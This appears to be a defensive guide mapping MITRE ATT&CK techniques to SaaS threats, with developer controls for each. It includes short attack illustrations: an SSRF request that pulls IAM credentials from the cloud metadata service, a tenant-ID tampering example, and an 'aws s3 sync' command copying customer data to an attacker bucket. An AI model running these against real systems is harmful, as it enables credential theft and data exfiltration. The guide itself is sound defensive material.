# ATT&CK for SaaS Products

> **30-second summary:** SaaS products face a distinct threat profile from traditional web apps: attackers target identity providers, OAuth grants, tenant isolation boundaries, and the SaaS management plane rather than just the application layer. This file maps the MITRE ATT&CK techniques most relevant to SaaS developers and operators, with actionable developer controls for each.

---

## Why SaaS Is Different

A traditional web app has one "tenant" — the organisation running it. A SaaS product has many tenants sharing the same infrastructure. This creates unique attack surfaces:

- **Tenant isolation failures** — one customer's data leaks into another's
- **Identity provider compromise** — attacking the IdP (Okta, Auth0, Azure AD) affects all tenants
- **OAuth grant abuse** — malicious apps gain persistent access via legitimate OAuth flows
- **Admin plane attacks** — the SaaS control plane (billing, user management, feature flags) is itself an attack target
- **Insider threat at scale** — a compromised SaaS employee can access all tenant data

---

## Initial Access (TA0001) — SaaS Focus

### T1078 — Valid Accounts

The most common SaaS initial access vector. Attackers use:

- **Credential stuffing** — automated login attempts with breached email/password pairs
- **Password spraying** — trying common passwords against every account to avoid lockout
- **Session token theft** — XSS or network interception stealing authentication cookies/tokens

**Real story:** The 2022 Okta breach began when the LAPSUS$ group compromised a support engineer's laptop via T1078.003 (Cloud Accounts). Because Okta's support team had access to customer tenants, this gave attackers visibility into hundreds of customers' user lists.

**Developer controls:**
- Enforce MFA for all users; make it mandatory, not optional
- Implement anomaly-based login detection (new country, new device)
- Bind sessions to the originating IP range or use device fingerprinting
- Use short-lived access tokens (15–60 minutes); refresh tokens should rotate on use

### T1566 — Phishing

Targeting your users or employees via email to harvest credentials or OAuth tokens.

**Developer controls:**
- Publish a DMARC, DKIM, and SPF policy to prevent email spoofing of your domain
- Warn users when emails arrive from addresses similar to your domain
- Implement login anomaly alerts ("We noticed a login from a new device in Berlin — was this you?")

### T1195 — Supply Chain Compromise

Third-party integrations, npm packages, and CI/CD tooling in your pipeline are all initial access vectors.

**Developer controls:**
- Audit all third-party OAuth integrations and API keys in your stack
- Lock dependencies with lockfiles; use `npm audit` and Dependabot
- See `../05-supply-chain-security/` for the full treatment

---

## Persistence (TA0003) — SaaS Focus

### T1098 — Account Manipulation

After initial access, attackers create new admin accounts, add themselves to groups, or register persistent OAuth applications.

**Sub-techniques relevant to SaaS:**

| Sub-technique | Description |
|--------------|-------------|
| T1098.001 | Additional Cloud Credentials — adding SSH keys or API tokens to a compromised account |
| T1098.003 | Additional Cloud Roles — elevating a compromised account to admin |
| T1098.005 | Device Registration — registering a new MFA device to maintain access |

**Real story:** In the 2023 Microsoft Exchange Online breach (attributed to Storm-0558), attackers forged authentication tokens to maintain persistent access to email accounts across tenants — a T1098.001 variant using a stolen signing key.

**Developer controls:**
- Alert immediately when new API keys, OAuth apps, or admin accounts are created
- Require approval workflows for admin role grants
- Audit MFA device registrations; alert on new device additions
- Implement "break glass" account monitoring — alert on every use of super-admin credentials

### T1505.003 — Web Shell

In containerised SaaS, persistence via filesystem is rarer, but attackers may plant malicious Lambda functions, webhooks, or serverless jobs.

**Developer controls:**
- Treat infrastructure as code; any resources not in your IaC definitions should trigger alerts
- Audit cloud functions and scheduled jobs regularly
- Use GitOps — all infrastructure changes go through reviewed pull requests

---

## Privilege Escalation (TA0004) — SaaS Focus

### T1078.004 — Cloud Accounts

SaaS applications run on cloud infrastructure. Over-permissioned service accounts are the primary privilege escalation path.

**The metadata service attack:**
In cloud environments, the instance metadata service (IMDS) is accessible at `169.254.169.254` from any process running on the VM. A successful SSRF vulnerability can lead an attacker to retrieve IAM credentials from this endpoint.

```
# What an attacker retrieves via SSRF to the metadata service:
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole

{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-01T00:00:00Z"
}
```

**Developer controls:**
- Enable IMDSv2 (requires session tokens; prevents simple SSRF exploitation)
- Block `169.254.169.254` and `fd00:ec2::254` at the application firewall layer
- Scope IAM roles to minimum required permissions; review with AWS IAM Access Analyzer
- Use dynamic short-lived credentials (AWS Roles, Workload Identity) rather than long-lived keys

### T1548 — Abuse Elevation Control Mechanism

In multi-tenant SaaS, this often manifests as horizontal privilege escalation — accessing another tenant's data by manipulating a tenant ID in an API request.

```
# Insecure: tenant ID comes from the request
GET /api/invoices?tenant_id=12345

# Attacker changes it:
GET /api/invoices?tenant_id=99999
```

**Developer controls:**
- Never derive tenant context from user-supplied parameters
- Always derive tenant context from the authenticated session/JWT
- Implement row-level security (RLS) at the database layer (Postgres RLS, Supabase RLS)
- Test for IDOR (Insecure Direct Object Reference) across tenant boundaries

---

## Lateral Movement (TA0008) — SaaS Focus

### T1199 — Trusted Relationship

SaaS products often grant elevated access to integration partners, resellers, or support tools. Compromising these gives attackers a path into customer tenants.

**Real story:** The Okta breach (above) is a textbook example of T1199 — the attacker didn't attack Okta's core systems; they compromised a third-party support tool that had trusted access to customer data.

**Developer controls:**
- Apply least-privilege to all partner/support access; support agents should not have read access to customer data by default
- Implement time-bound, purpose-bound access grants for support scenarios
- Log all support access; surface it to customers in their audit log
- Require MFA for all third-party support tool access

### T1552 — Unsecured Credentials in Configuration

Service-to-service credentials hardcoded in configuration files, environment variables, or container images allow lateral movement if one service is compromised.

**Developer controls:**
- Use a secrets manager (AWS Secrets Manager, HashiCorp Vault, Doppler) instead of environment variables for sensitive credentials
- Rotate service-to-service credentials automatically
- Scan container images for embedded secrets before pushing to registry

---

## Collection (TA0009) — SaaS Focus

### T1530 — Data from Cloud Storage

In SaaS, the most valuable data lives in databases, object storage (S3, GCS), and data warehouses. Misconfigured access policies are the primary risk.

**Common misconfigurations:**

| Misconfiguration | Risk |
|-----------------|------|
| S3 bucket with public `GetObject` | Any internet user can download all files |
| Wildcard IAM policy (`s3:* on *`) | Compromised service can access all buckets |
| No encryption at rest | Exfiltrated data is immediately readable |
| No CloudTrail logging | No visibility into data access |

**Developer controls:**
- Enable S3 Block Public Access at the account level
- Use bucket policies with explicit tenant-scoped prefixes
- Enable encryption at rest with customer-managed keys (CMK) for sensitive data
- Turn on CloudTrail and S3 server access logging; alert on unusual bulk access

### T1213 — Data from Information Repositories

Internal tooling (Confluence, Notion, Slack) often contains credentials, architecture diagrams, and customer data. Attackers with employee-level access mine these.

**Developer controls:**
- Apply the principle of least privilege to internal documentation tools
- Do not store production credentials, customer PII, or private keys in wikis
- Audit sharing settings on internal documents regularly

---

## Exfiltration (TA0010) — SaaS Focus

### T1537 — Transfer Data to Cloud Account

An attacker with IAM credentials can copy data directly to their own cloud account — bypassing network egress controls entirely.

```bash
# Attacker with stolen credentials:
aws s3 sync s3://your-customer-data s3://attacker-bucket --source-region us-east-1
```

**Developer controls:**
- Use AWS Service Control Policies (SCPs) to prevent data being copied to accounts outside your organisation
- Enable AWS Macie or equivalent DLP to detect bulk PII exfiltration
- Alert on `aws:RequestedRegion` conditions; alert on cross-account S3 operations

---

## Impact (TA0040) — SaaS Focus

### T1485 — Data Destruction

Ransomware groups increasingly target SaaS data stores — deleting database backups and cloud storage before demanding payment.

**Real story:** Multiple AWS customers have suffered attacks where IAM credentials were stolen and used to delete S3 objects and RDS snapshots before the attacker notified the victim and requested payment.

**Developer controls:**
- Enable S3 Object Lock (WORM storage) for backups
- Enable MFA Delete on critical S3 buckets
- Test your backup restore process quarterly — a backup you haven't tested isn't a backup
- Keep backups in a separate AWS account with minimal cross-account permissions

---

## SaaS-Specific Controls Summary

| Risk Area | Primary ATT&CK Techniques | Key Control |
|-----------|--------------------------|-------------|
| Identity compromise | T1078, T1566 | Mandatory MFA; anomaly detection on logins |
| OAuth persistence | T1098 | Audit and alert on new OAuth grants and admin accounts |
| Tenant isolation | T1548 | RLS at database layer; derive tenant from session not URL |
| Cloud privilege escalation | T1078.004, T1552 | IMDSv2; least-privilege IAM; secrets manager |
| Trusted relationship abuse | T1199 | Scoped support access; customer-visible audit logs |
| Data exfiltration | T1530, T1537 | SCPs; S3 Block Public Access; CloudTrail alerts |
| Backup destruction | T1485 | S3 Object Lock; MFA Delete; isolated backup account |

---

## Further Reading

- [ATT&CK for SaaS](https://attack.mitre.org/matrices/enterprise/saas/)
- [MITRE ATT&CK Cloud Matrix](https://attack.mitre.org/matrices/enterprise/cloud/)
- [CSA Cloud Controls Matrix](https://cloudsecurityalliance.org/research/cloud-controls-matrix/)
- See `attck-for-web-apps.md` for the web application layer techniques
